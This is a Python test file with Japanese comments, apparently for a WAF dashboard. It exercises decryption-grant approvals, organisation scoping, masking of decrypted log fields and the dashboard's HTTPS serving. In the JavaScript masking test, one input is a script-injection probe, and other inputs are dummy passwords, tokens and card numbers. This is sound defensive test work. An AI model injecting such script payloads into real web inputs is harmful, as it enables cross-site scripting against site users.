    d_ = ts2_.decide_grant(t_["id"], "orguser", True, 2)
    check("復号の申請: 承認すると承認者と期限が入る", d_["status"] == "done" and d_["grant"]["approved_by"] == "orguser" and d_["grant"]["until"] > now_)
    try:
        ts2_.decide_grant(t_["id"], "orguser", False); ok_ = False
    except ValueError:
        ok_ = True
    check("復号の申請: 分まで入力した終了日時は、その分の終わり(:59)まで含める",
          wt_._clean_grant({"from": "2026-10-23T10:00", "to": "2026-10-23T10:08"}) == {"from": "2026-10-23T10:00:00", "to": "2026-10-23T10:08:59"})
    check("復号の申請: 完了済みは再度決められない", ok_)
    _t3 = ts2_.create("ko", "decrypt", "be_a", "y", "理由です。", None, role="key_officer", org="a", stage="admin",
                      grant={"from": "2026-10-23T10:00:00", "to": "2026-10-23T11:00:00"})
    _d3 = ts2_.decide_grant(_t3["id"], "a-soc", True, 1, role="analyst")
    check("復号の申請: アナリストが承認すると、記録にアナリストの役割が残る", _d3["status"] == "done" and _d3["comments"][-1]["role"] == "analyst")
    _rv = ts2_.create("a-soc", "log_review", "be_a", "確認", "本文", role="analyst", org="a", stage="ko")
    _dd = ts2_.create("ko", "decrypt", "be_a", "z", "【ログ確認依頼 %s】確認" % _rv["id"], None, role="key_officer", org="a", stage="admin",
                      grant={"from": "2026-10-23T10:00:00", "to": "2026-10-23T11:00:00"})
    _r2 = ts2_.link_review(_dd["id"], _rv["id"], "ko")
    check("復号の申請: 確認依頼から出すと、依頼が自動で「対応中」になる", _r2["status"] == "in_progress" and ts2_.get(_dd["id"])["review"] == _rv["id"])
    ts2_.decide_grant(_dd["id"], "a-soc", True, 1, role="analyst")
    _r3 = ts2_.get(_rv["id"])
    check("復号の申請: 承認されると、確認依頼のコメントに残る(状態はキー・オフィサーが決める)", _r3["status"] == "in_progress" and "承認" in _r3["comments"][-1]["text"])
    check("申請から「キー・オフィサーへ依頼」: サーバーと画面の部品がある",
          all(k in open(dashboard.__file__, encoding="utf-8").read() for k in ('p.endswith("/to_ko")', "function tkToKo", "/api/tickets/to_ko", "tkK-")))
    check("復号の承認: 利用企業側のアナリストも承認できる(画面・サーバー)",
          "if role == \"analyst\":" in open(dashboard.__file__, encoding="utf-8").read() and "is_vendor_user(self._user)) and self._covers_org" in open(dashboard.__file__, encoding="utf-8").read())
    e_ = {"enc": {"kid": "K", "iv": "I", "ct": "SECRETCT", "ek": "EK"}, "client_ip": "1"}
    check("イベント: 暗号文は返さず、ロック表示と識別子だけ",
          "SECRETCT" not in json.dumps(dashboard._enc_public(e_)) and dashboard._enc_public(e_)["enc_locked"] and "enc" not in dashboard._drop_enc(e_) and dashboard._drop_enc(e_)["eid"] == "I")
    check("画面: 暗号ログ画面(鍵作成・鍵の読み込み・申請・復号・操作記録)がある",
          all(k in dashboard.PAGE for k in ("page-enc", "encWGen", "encLoadPriv", "encRequest", "RSA-OAEP", "/api/enc/fetch", "/api/enc/audit", "tkDecide", "encForgetKey", 'value="key_officer"')))
    check("画面: 暗号ログの一覧に並べ替え・絞り込み・ページ送り・まとめて復号・検索・この日時で申請・鍵のドロップ・残り時間・鍵の登録日がある",
          all(k in dashboard.PAGE for k in ("encSort", "encFApply", "encPage", "encBulk", "encDSearch", "encReqFor", "encDropKey", "encRemain", "key_at", "/api/enc/fetch_many", "encTkState")))
    check("画面: 暗号ログの配色はテーマの変数を使い(ダーク/ライトで別の濃さ)、固定の暗い色に頼らない",
          "--e-ok:#0b7d4e" in dashboard.PAGE and "--e-ng:#c4352e" in dashboard.PAGE and "var(--line,#2a2f3a)" not in dashboard.PAGE.split("body.kofficer #nav")[1].split("body.guser #page-ip .iplist button")[0])
    import re as re_, shutil as sh_, subprocess as sp_
    if sh_.which("node"):
        js_ = max(re_.findall(r"<script>(.*?)</script>", dashboard.PAGE, re_.S), key=len)
        jp_ = os.path.join(TMP, "page_check.js"); open(jp_, "w", encoding="utf-8").write(js_)
        rr_ = sp_.run(["node", "--check", jp_], capture_output=True, text=True)
        check("画面: ダッシュボードのJavaScriptに構文エラーがない(node --check)", rr_.returncode == 0)
    if sh_.which("node"):
        i0_ = dashboard.PAGE.index("const MASK_TXT=")
        i1_ = dashboard.PAGE.index("function encApplyMask")
        mj_ = "const DEC={mask:true};\n" + dashboard.PAGE[i0_:i1_] + """
const ok=(c)=>c?1:0; let r=[];
r.push(maskText('a=1&password=hunter2&b=2')==='a=1&password='+MASK_TXT+'&b=2');
r.push(maskText('{"api_token":"abc","x":"y"}')==='{"api_token":"'+MASK_TXT+'","x":"y"}');
r.push(maskText('q=<script>alert(1)</script>&id=42')==='q=<script>alert(1)</script>&id=42');
r.push(maskText('card 4111 1111 1111 1111 ok')==='card ●●●●●●●●●●●●1111 ok');
r.push(maskText('id 1234567890123456')==='id 1234567890123456');
r.push(maskText('no=123456789012')==='no=●●●●-●●●●-●●●●');
r.push(maskText('ts=1700000000000')==='ts=1700000000000');
const o=maskDeep({headers:{Cookie:'sid=1','User-Agent':'x',Authorization:'Bearer z'},body:'pw=1&sessionid=zz'});
r.push(o.headers.Cookie===MASK_TXT&&o.headers.Authorization===MASK_TXT&&o.headers['User-Agent']==='x'&&o.body==='pw=1&sessionid='+MASK_TXT);
console.log(r.map(ok).join(''));
"""
        mp_ = os.path.join(TMP, "mask_check.js"); open(mp_, "w", encoding="utf-8").write(mj_)
        mr_ = sp_.run(["node", mp_], capture_output=True, text=True)
        check("復号結果のマスク: 認証情報・カード番号(Luhn)・マイナンバー形式を伏せ、普通の値は残す", mr_.stdout.strip() == "11111111")
    check("画面: 復号結果は既定でマスクされ、外す/かけ直しは操作記録に残る", all(k in dashboard.PAGE for k in ("encUnmask", "encRemask", "/api/enc/unmask_log", "マスクを外した", "__raw")))
    check("画面: 鍵の作成と同時に公開鍵を登録でき、デモ設定でコピー・ダウンロードできる(本番はOFFにできる)",
          all(k in dashboard.PAGE for k in ("encWRegister", "encGenCopy", "encGenDl", "encGenBox", "demo_keys")) and waf.DEFAULT_CONFIG.get("enc_demo_keys") is True)
    check("画面: キー・オフィサーの画面がタブ(調べる/申請/鍵の管理/操作記録)と要約カードで整理され、鍵ウィザード(保管の確認つき)・複数鍵・期間プリセット・選んで申請・件数表示がある",
          all(k in dashboard.PAGE for k in ("enc-tabs", "enc-cards", "encTab", "encWVerify", "encWSteps", "encKidOf", "DEC.keys", "encPreset", "encReason", "encReqFromSel", "encReqPreview", "/api/enc/count", "encGrantGo", "encDecShow", "enc_count", "encReqOrg", "encFOrg", "encReqWho")))
    # ベンダー(提供元)の組織: 最初から1つある
    _v = wo.normalize_orgs([])
    check("ベンダー組織: 空の一覧でも最初から1つ入っている", len(_v) == 1 and _v[0]["id"] == "vendor" and _v[0]["type"] == "vendor")
    _vc = {"orgs": [], "backends": [], "dashboard": {"users": []}}
    def _vbad(f):
        try:
            f(); return False
        except ValueError:
            return True
    check("ベンダー組織: 削除・種類変更・親の指定・2つ目の追加はできない",
          _vbad(lambda: wo.orgs_op(_vc, {"op": "delete_org", "id": "vendor"}))
          and _vbad(lambda: wo.orgs_op(_vc, {"op": "update_org", "id": "vendor", "type": "direct"}))
          and _vbad(lambda: wo.orgs_op(_vc, {"op": "add_org", "id": "v2", "type": "vendor"}))
          and _vbad(lambda: wo.orgs_op(_vc, {"op": "add_org", "id": "vendor", "type": "direct"})))
    wo.orgs_op(_vc, {"op": "add_org", "id": "ca", "name": "C社", "type": "direct"})
    wo.orgs_op(_vc, {"op": "add_org", "id": "cb", "name": "B代理店", "type": "intermediary"})
    wo.orgs_op(_vc, {"op": "update_org", "id": "vendor", "name": "提供元"})
    _vo = _vc["orgs"]
    check("ベンダー組織: 名前は変えられる。直接契約を足してもベンダーが先頭に残る", _vo[0]["id"] == "vendor" and _vo[0]["name"] == "提供元" and len(_vo) == 3)
    _vu = [{"username": "vs", "role": "analyst", "org": "vendor", "scope": []}, {"username": "as", "role": "analyst", "org": "", "scope": ["ca"]},
           {"username": "vk", "role": "key_officer", "org": "vendor", "scope": []}, {"username": "vu", "role": "user", "org": "vendor"}]
    check("ベンダー組織: 所属ベンダーのキー・オフィサーは全組織、アナリストは担当のいない組織だけ、一般はベンダーだけ",
          wo.scope_orgs(_vo, _vu[2], _vu) == {"vendor", "ca", "cb"}
          and wo.scope_orgs(_vo, _vu[0], _vu) == {"vendor", "cb"}
          and wo.scope_orgs(_vo, _vu[3], _vu) == {"vendor"})
    _old = {"role": "analyst", "org": "", "scope": [], "provider": True}
    check("ベンダー組織: 古い provider フラグも同じ扱い", wo.scope_orgs(_vo, _old, _vu) == {"vendor", "cb"})
    import waf as _wafmod
    _tmpc = os.path.join(tempfile.mkdtemp(), "c.json")
    with open(_tmpc, "w", encoding="utf-8") as _f:
        json.dump({"dashboard": {"users": [{"username": "p", "role": "key_officer", "provider": True}]}}, _f)
    _lc = _wafmod.load_config(_tmpc)
    check("ベンダー組織: 読み込み時に補われ、provider フラグはベンダー所属に移る",
          _lc["orgs"][0]["id"] == "vendor" and _lc["dashboard"]["users"][0]["org"] == "vendor" and _lc["dashboard"]["users"][0]["provider"] is False)
    check("画面: 組織の画面にマスクのチェックは無く、暗号ログ画面のボタンはダークモードの色に合う", "アナリストへのマスク" not in dashboard.PAGE.split("function renderOrgs")[1].split("function orgAdd")[0] and ".enc-page button{background:var(--surface-2)" in dashboard.PAGE)
    check("画面: 設定画面の入力欄・ボタンと、ファイル選択ボタンがダークモードの色に合う",
          ".set-row input[type=text]" in dashboard.PAGE and ".set-row button{background:var(--surface-2)" in dashboard.PAGE and "::file-selector-button{background:var(--surface-2)" in dashboard.PAGE)
    check("画面: KO画面はタブに番号が無く、承認済みの範囲→秘密鍵→(折りたたみの)ログ一覧の順で、ヘッダーの余計な表示が無い",
          "'調べる(復号)'" in dashboard.PAGE and "① 調べる" not in dashboard.PAGE and "encLogDet" in dashboard.PAGE and "ENC_LOGOPEN" in dashboard.PAGE
          and dashboard.PAGE.index("承認済みの範囲(いま復号できます)") < dashboard.PAGE.index('id="encKeyBox"') < dashboard.PAGE.index('id="encLogDet"')
          and "body.kofficer #nav,body.kofficer #meta" in dashboard.PAGE and "kb-more" in dashboard.PAGE and "body.kofficer header .controls{margin-left:auto}" in dashboard.PAGE)
    check("画面: ログの確認依頼(アナリスト→KO)の入力・KO画面の一覧と操作、管理者は申請フォームなし",
          all(k in dashboard.PAGE for k in ("log_review", "encRvHtml", "encRvUse", "encRvSt", "tkKindChanged")) and "role==='admin'?[]" in dashboard.PAGE)
    import waf_tickets as _wt
    _tp = os.path.join(tempfile.mkdtemp(), "t.json")
    _ts = _wt.TicketStore(_tp)
    _t1 = _ts.create("soc", "log_review", "be1", "確認依頼", "本文", role="analyst", org="a", stage="ko")
    _t2 = _ts.set_status(_t1["id"], "in_progress", "ko", role="key_officer")
    check("申請: ログの確認依頼はKO対応の段階で作られ、KOが状態を変えると記録に役割が残る",
          _t1["kind"] == "log_review" and _t1["stage"] == "ko" and _t2["status"] == "in_progress" and _t2["stage"] == "ko"
          and _t2["comments"][-1]["role"] == "key_officer" and "log_review" in _wt.KINDS)
    check("画面: 無操作時間の選択・最大保持時間・消去前の警告・7日承認", all(k in dashboard.PAGE for k in ("encIdleOpts","encIdleSet","encExtend","hardUntil",'value="168"')))
    _st = waf.Control.enc_state if hasattr(waf, "Control") else None
    check("設定: enc_idle_max_min / enc_hold_max_min の既定", waf.DEFAULT_CONFIG.get("enc_idle_max_min") == 60 and waf.DEFAULT_CONFIG.get("enc_hold_max_min") == 120)
    check("画面: 復号した鍵と中身は、詳細を閉じる/5分/離れると消える", "encWipe" in dashboard.PAGE and "encArm" in dashboard.PAGE and "encForgetKey" in dashboard.PAGE)
    # 管理画面のHTTPS
    import ssl as ssl_, tempfile as tf_
    td_ = tf_.mkdtemp()
    cf_, kf_ = os.path.join(td_, "c.pem"), os.path.join(td_, "k.pem")
    check("管理画面: tls=false ならHTTP(TLSコンテキストを作らない)", waf.dashboard_tls_context({"dashboard": {"tls": False}}) is None)
    ctx_ = waf.dashboard_tls_context({"dashboard": {"tls": True, "tls_certfile": cf_, "tls_keyfile": kf_}, "tls_autogen": True})
    check("管理画面: tls=true なら自己署名証明書を自動生成してTLSコンテキストを作る", ctx_ is not None and os.path.exists(cf_) and os.path.exists(kf_))
    check("管理画面: 自動生成が禁止で証明書が無ければHTTPで起動する(落ちない)",
          waf.dashboard_tls_context({"dashboard": {"tls": True, "tls_certfile": os.path.join(td_, "x.pem"), "tls_keyfile": os.path.join(td_, "y.pem")}, "tls_autogen": False}) is None)
    h_ = dashboard.make_handler(os.path.join(td_, "none.log"), None)
    sv_ = dashboard.TLSThreadingHTTPServer(("127.0.0.1", 0), h_)
    sv_.ssl_context, sv_.is_tls = ctx_, True
    threading.Thread(target=sv_.serve_forever, daemon=True).start()
    try:
        cx_ = ssl_.create_default_context(); cx_.check_hostname = False; cx_.verify_mode = ssl_.CERT_NONE
        hc_ = http.client.HTTPSConnection("127.0.0.1", sv_.server_address[1], context=cx_, timeout=5)
        hc_.request("GET", "/api/auth"); r_ = hc_.getresponse(); b_ = r_.read()
        ok_https_ = r_.status in (200, 302, 401)
        sk_ = socket.create_connection(("127.0.0.1", sv_.server_address[1]), timeout=3)      # 握手しない接続があっても、ほかの接続は処理できる
        hc2_ = http.client.HTTPSConnection("127.0.0.1", sv_.server_address[1], context=cx_, timeout=5)
        hc2_.request("GET", "/api/auth"); ok_stall_ = hc2_.getresponse().status in (200, 302, 401)
        sk_.close()
    except Exception:
        ok_https_ = ok_stall_ = False
    finally:
        sv_.shutdown()
    check("管理画面: HTTPSで応答する", ok_https_)
    check("管理画面: TLSの握手をしない接続が1本あっても、待受全体は止まらない", ok_stall_)

    print(f"\n結果: PASS={PASS}  FAIL={FAIL}")
    return 0 if FAIL == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
